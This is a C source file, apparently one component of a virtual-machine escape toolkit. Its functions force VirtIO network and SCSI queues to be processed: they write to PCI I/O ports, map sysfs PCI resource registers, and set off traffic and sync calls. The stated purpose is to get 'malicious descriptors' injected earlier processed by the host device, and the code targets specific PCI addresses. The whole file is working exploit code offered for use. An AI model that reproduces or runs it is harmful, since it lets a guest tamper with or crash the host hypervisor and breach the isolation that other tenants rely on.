#define _GNU_SOURCE
#include <sys/io.h>
#include <unistd.h>
#ifndef QUEUE_KICKING_H
#define QUEUE_KICKING_H

#include <stdint.h>

// Function declarations
void kick_via_pci_io(uint16_t pci_base, uint16_t queue_id);
void kick_queue_mmio(const char *pci_device, uint16_t queue_id);
void kick_via_sysfs(const char *pci_device, uint16_t queue_id);
void kick_via_network_trigger(void);
void kick_via_block_io(void);
void comprehensive_queue_kicking(void);

#endif // QUEUE_KICKING_H

// ===== IMPLEMENTATION =====

#include "queue_kicking.h"
#include "virtio_structs.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>
#include <errno.h>

void kick_via_pci_io(uint16_t pci_base, uint16_t queue_id) {
    printf("\n=== PCI I/O Port Queue Kicking ===\n");
    
    if (iopl(3) == 0) {
        printf("Got I/O port permissions\n");
        
        uint16_t notify_addr = pci_base + VIRTIO_PCI_QUEUE_NOTIFY;
        
        printf("  PCI Base: 0x%04x\n", pci_base);
        printf("  Notify Address: 0x%04x\n", notify_addr);
        printf("  Queue ID: %u\n", queue_id);
        
        printf("  >>> KICKING QUEUE %u <<<\n", queue_id);
        outw(queue_id, notify_addr);
        
        printf("  Queue kick sent via PCI I/O!\n");
        printf("  Device should now process descriptors in queue %u\n", queue_id);
        
        iopl(0);
    } else {
        printf("Failed to get I/O permissions: %s\n", strerror(errno));
        printf("  (Try running with sudo for I/O port access)\n");
    }
}

void kick_queue_mmio(const char *pci_device, uint16_t queue_id) {
    printf("\n=== KICKING QUEUE VIA MMIO ===\n");
    
    // Try resource1 first (MMIO BAR at 0x80000000)
    char resource_path[256];
    snprintf(resource_path, sizeof(resource_path), 
             "/sys/bus/pci/devices/%s/resource1", pci_device);
    
    int fd = open(resource_path, O_RDWR);
    if (fd >= 0) {
        printf("Opened PCI MMIO resource1: %s\n", resource_path);
        
        size_t reg_size = 4096;
        void *regs = mmap(NULL, reg_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        
        if (regs != MAP_FAILED) {
            printf("Mapped VirtIO MMIO registers at %p\n", regs);
            
            // VirtIO MMIO register offsets
            volatile uint32_t *queue_notify = (volatile uint32_t*)((char*)regs + 0x50);
            volatile uint32_t *queue_sel = (volatile uint32_t*)((char*)regs + 0x30);
            
            *queue_sel = queue_id;
            printf("  Selected queue %u\n", queue_id);
            
            printf("  >>> KICKING QUEUE %u VIA MMIO <<<\n", queue_id);
            *queue_notify = queue_id;
            
            printf("  Queue kick sent! Device should process injected descriptors.\n");
            
            munmap(regs, reg_size);
        } else {
            printf("Failed to map MMIO registers: %s\n", strerror(errno));
        }
        close(fd);
    } else {
        printf("Failed to open PCI MMIO resource1: %s\n", strerror(errno));
        
        // Fallback to resource0 with PCI I/O register layout
        printf("  Trying resource0 as fallback...\n");
        snprintf(resource_path, sizeof(resource_path), 
                 "/sys/bus/pci/devices/%s/resource0", pci_device);
        
        fd = open(resource_path, O_RDWR);
        if (fd >= 0) {
            printf("Opened PCI I/O resource0: %s\n", resource_path);
            
            size_t reg_size = 4096;
            void *regs = mmap(NULL, reg_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
            
            if (regs != MAP_FAILED) {
                volatile uint16_t *queue_notify = (volatile uint16_t*)((char*)regs + VIRTIO_PCI_QUEUE_NOTIFY);
                volatile uint16_t *queue_sel = (volatile uint16_t*)((char*)regs + VIRTIO_PCI_QUEUE_SEL);
                
                *queue_sel = queue_id;
                printf("  Selected queue %u (PCI I/O mode)\n", queue_id);
                
                printf("  >>> KICKING QUEUE %u VIA PCI I/O MMIO <<<\n", queue_id);
                *queue_notify = queue_id;
                
                printf("  Queue kick sent via PCI I/O registers!\n");
                
                munmap(regs, reg_size);
            }
            close(fd);
        }
    }
}

void kick_via_sysfs(const char *pci_device, uint16_t queue_id) {
    printf("\n=== Sysfs-based Queue Kicking ===\n");
    
    char notify_path[256];
    snprintf(notify_path, sizeof(notify_path), 
             "/sys/bus/pci/devices/%s/virtio_queue_notify", pci_device);
    
    int fd = open(notify_path, O_WRONLY);
    if (fd >= 0) {
        printf("Found sysfs notify interface: %s\n", notify_path);
        
        char queue_str[16];
        snprintf(queue_str, sizeof(queue_str), "%u", queue_id);
        
        if (write(fd, queue_str, strlen(queue_str)) > 0) {
            printf("  Kicked queue %u via sysfs\n", queue_id);
        } else {
            printf("  Failed to write to sysfs: %s\n", strerror(errno));
        }
        close(fd);
    } else {
        printf("No sysfs notify interface found\n");
        printf("  (Expected - most systems don't expose this)\n");
    }
}

void kick_via_network_trigger(void) {
    printf("\n=== Network-Triggered Queue Kicking ===\n");
    
    printf("Attempting to trigger network queues by generating traffic...\n");
    
    printf("  Sending ping to trigger RX queue...\n");
    int ping_result = system("ping -c 1 8.8.8.8 >/dev/null 2>&1");
    
    if (ping_result == 0) {
        printf("  Ping successful - network queues were likely triggered\n");
        printf("  Any malicious descriptors in virtio1 queues may have been processed!\n");
    } else {
        printf("  Ping failed, but network stack still might have triggered queues\n");
    }
    
    printf("  Creating local network activity...\n");
    system("ss -tuln >/dev/null 2>&1");
    
    printf("  Generated local network activity\n");
}

void kick_via_block_io(void) {
    printf("\n=== Block I/O Queue Kicking ===\n");
    
    printf("Attempting to trigger block I/O queues...\n");
    
    printf("  Calling sync() to flush buffers...\n");
    sync();
    printf("  sync() completed - block queues likely activated\n");
    
    printf("  Reading from /proc/meminfo to trigger read I/O...\n");
    int fd = open("/proc/meminfo", O_RDONLY);
    if (fd >= 0) {
        char buffer[1024];
        ssize_t bytes = read(fd, buffer, sizeof(buffer));
        close(fd);
        
        if (bytes > 0) {
            printf("  Read %zd bytes - I/O queues activated\n", bytes);
        }
    }
}

void comprehensive_queue_kicking(void) {
    printf("\n" "=" "=" "=" " COMPREHENSIVE QUEUE KICKING " "=" "=" "=" "\n");
    printf("WARNING: This will attempt to kick VirtIO queues using multiple methods!\n");
    printf("Any malicious descriptors may be processed by the device!\n\n");
    
    printf("Target devices from earlier discovery:\n");
    printf("  • Network (virtio1): PCI 0000:00:04.0, Device 0x1000\n");
    printf("  • SCSI (virtio0):    PCI 0000:00:03.0, Device 0x1004\n\n");
    
    // Method 1: PCI I/O ports
    kick_via_pci_io(0xc000, 0);
    
    // Method 2: Memory-mapped I/O (corrected to use resource1)
    kick_queue_mmio("0000:00:04.0", 0);  // Network device
    kick_queue_mmio("0000:00:03.0", 0);  // SCSI device
    
    // Method 3: Sysfs interface
    kick_via_sysfs("0000:00:04.0", 0);
    kick_via_sysfs("0000:00:03.0", 0);
    
    // Method 4: Indirect triggers
    kick_via_network_trigger();
    kick_via_block_io();
    
    printf("\n" "=" "=" "=" " KICKING COMPLETE " "=" "=" "=" "\n");
    printf("If any method succeeded, your malicious descriptors may have been processed!\n");
    printf("Check system logs (dmesg, /var/log/kern.log) for any errors or crashes.\n");
}
